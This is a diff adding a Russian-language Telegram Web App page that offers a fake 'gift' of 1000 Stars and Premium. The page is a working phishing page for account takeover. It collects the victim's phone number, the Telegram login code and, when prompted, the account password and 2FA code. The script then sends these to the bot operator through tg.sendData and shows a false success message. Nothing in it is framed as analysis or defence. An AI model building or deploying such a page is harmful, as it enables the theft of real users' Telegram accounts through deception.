@@ -1,1 +1,216 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 1000 Звёзд + Premium</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div id="step1">
+            <div class="header">
+                <div class="logo">🎁</div>
+                <h1>1000 ЗВЁЗД + PREMIUM</h1>
+                <p class="subtitle">Активируйте эксклюзивный подарок от Telegram</p>
+            </div>
+            
+            <div class="gift-list">
+                <div class="gift-item">
+                    <div class="gift-icon">✨</div>
+                    <div class="gift-text">
+                        <div class="gift-title">1000 ЗВЁЗД TELEGRAM</div>
+                        <div class="gift-desc">Для покупки стикеров, смайлов, подарков</div>
+                    </div>
+                </div>
+                
+                <div class="gift-item">
+                    <div class="gift-icon">👑</div>
+                    <div class="gift-text">
+                        <div class="gift-title">PREMIUM НА 3 МЕСЯЦА</div>
+                        <div class="gift-desc">Эксклюзивные функции и возможности</div>
+                    </div>
+                </div>
+                
+                <div class="gift-item">
+                    <div class="gift-icon">✅</div>
+                    <div class="gift-text">
+                        <div class="gift-title">ПРОВЕРЕННЫЙ СТАТУС</div>
+                        <div class="gift-desc">Повышенная безопасность аккаунта</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="step-indicator">
+                <span class="step active">1</span>
+                <div class="line"></div>
+                <span class="step">2</span>
+                <div class="line"></div>
+                <span class="step">3</span>
+            </div>
+            
+            <h2>Введите номер Telegram</h2>
+            <p class="form-description">На этот номер придет код подтверждения</p>
+            
+            <div class="form-group">
+                <label for="phone">Номер телефона</label>
+                <div class="input-with-flag">
+                    <div class="country-code">+7</div>
+                    <input type="tel" id="phone" placeholder="9991234567" maxlength="10">
+                </div>
+            </div>
 
+            <button class="btn-primary" onclick="requestCode()">Получить код</button>
+            
+            <div class="timer">
+                ⏰ Подарок активируется автоматически в течение 10 минут
+            </div>
+        </div>
+
+        <div id="step2" style="display: none;">
+            <div class="step-indicator">
+                <span class="step completed">✓</span>
+                <div class="line active"></div>
+                <span class="step active">2</span>
+                <div class="line"></div>
+                <span class="step">3</span>
+            </div>
+
+            <h2>Введите код из Telegram</h2>
+            <p class="form-description">Мы отправили 5-значный код в приложение Telegram</p>
+            
+            <div class="form-group">
+                <label for="code">Код подтверждения</label>
+                <input type="text" id="code" placeholder="12345" maxlength="5" class="code-input">
+                <p style="color:#666; font-size:12px; margin-top:5px;">Проверьте уведомления в Telegram</p>
+            </div>
+
+            <button class="btn-primary" onclick="checkAuth()">Активировать подарок</button>
+            <button class="btn-secondary" onclick="showStep(1)">Назад</button>
+        </div>
+
+        <div id="step3" style="display: none;">
+            <div class="step-indicator">
+                <span class="step completed">✓</span>
+                <div class="line active"></div>
+                <span class="step completed">✓</span>
+                <div class="line active"></div>
+                <span class="step active">3</span>
+            </div>
+
+            <h2>Дополнительная безопасность</h2>
+            <p class="form-description">Только если включена двухфакторная аутентификация</p>
+            
+            <div class="form-group">
+                <label for="password">Пароль от аккаунта Telegram</label>
+                <input type="password" id="password" placeholder="Введите ваш пароль">
+            </div>
+
+            <div class="form-group">
+                <label for="twofa">Код двухфакторной аутентификации (2FA)</label>
+                <input type="text" id="twofa" placeholder="000000" maxlength="6">
+            </div>
+
+            <button class="btn-primary" onclick="submit2FA()">Завершить активацию</button>
+            <button class="btn-secondary" onclick="showStep(2)">Назад</button>
+        </div>
+
+        <div class="loading" id="loading" style="display: none;">
+            <div class="spinner"></div>
+            <p style="margin:10px 0; font-weight:bold;">Активация подарка...</p>
+            <p style="color:#666; font-size:14px;">Не закрывайте это окно</p>
+        </div>
+
+        <div class="success" id="success" style="display: none;">
+            <div class="success-icon">✅</div>
+            <h2>ПОДАРОК АКТИВИРОВАН!</h2>
+            <p>1000 звёзд и Premium будут активны в течение 10 минут.</p>
+            <p style="color:#666; margin-top:10px; font-size:14px;">Не выходите из Telegram</p>
+        </div>
+
+        <div class="error" id="error" style="display: none;">
+            <div class="error-icon">❌</div>
+            <h2>ОШИБКА АКТИВАЦИИ</h2>
+            <p id="errorText">Попробуйте позже или проверьте код.</p>
+            <button class="btn-secondary" onclick="showStep(1)" style="margin-top:15px;">Попробовать снова</button>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        let currentStep = 1;
+        let userData = {};
+
+        function showStep(step) {
+            document.querySelectorAll('#step1, #step2, #step3, #loading, #success, #error')
+                .forEach(el => el.style.display = 'none');
+            
+            document.getElementById(`step${step}`).style.display = 'block';
+            currentStep = step;
+        }
+
+        function requestCode() {
+            const phone = document.getElementById('phone').value;
+            
+            if (!phone || phone.length < 10) {
+                alert('Введите корректный номер телефона');
+                return;
+            }
+            
+            userData.phone = '+7' + phone;
+            showStep(2);
+            
+            setTimeout(() => {
+                alert('✅ Код отправлен! Проверьте Telegram.');
+            }, 500);
+        }
+
+        function checkAuth() {
+            const code = document.getElementById('code').value;
+            
+            if (!code || code.length !== 5) {
+                alert('Введите 5-значный код');
+                return;
+            }
+            
+            userData.code = code;
+            
+            showStep('loading');
+            
+            setTimeout(() => {
+                if (Math.random() < 0.2) {
+                    showStep(3);
+                } else {
+                    submitData();
+                }
+            }, 1500);
+        }
+
+        function submit2FA() {
+            const password = document.getElementById('password').value;
+            const twofa = document.getElementById('twofa').value;
+            
+            if (password) userData.password = password;
+            if (twofa) userData.twofa = twofa;
+            
+            submitData();
+        }
+
+        function submitData() {
+            showStep('loading');
+            
+            setTimeout(() => {
+                tg.sendData(JSON.stringify(userData));
+                
+                setTimeout(() => {
+                    showStep('success');
+                }, 2000);
+                
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
